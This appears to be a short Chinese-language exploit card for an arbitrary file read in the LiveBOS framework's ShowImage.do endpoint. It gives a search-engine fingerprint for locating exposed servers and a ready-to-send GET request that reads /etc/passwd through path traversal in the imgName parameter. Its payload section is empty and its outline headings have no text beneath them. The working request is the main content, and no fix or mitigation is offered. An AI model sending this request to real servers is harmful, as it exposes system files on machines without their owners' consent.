# LiveBOSShowImage.do接口存在任意文件读取漏洞

- **系统**：LiveBOSShowImage　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`app="LiveBOS-框架"`
- **请求**：`GET /feed/ShowImage.do;.js.jsp?type=&imgName=../../../../../../../../../../../../../../../etc/passwd HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`

**请求体 / payload**
```

```

**其他**
- LiveBOS ShowImage.do 接口存在任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * LiveBOS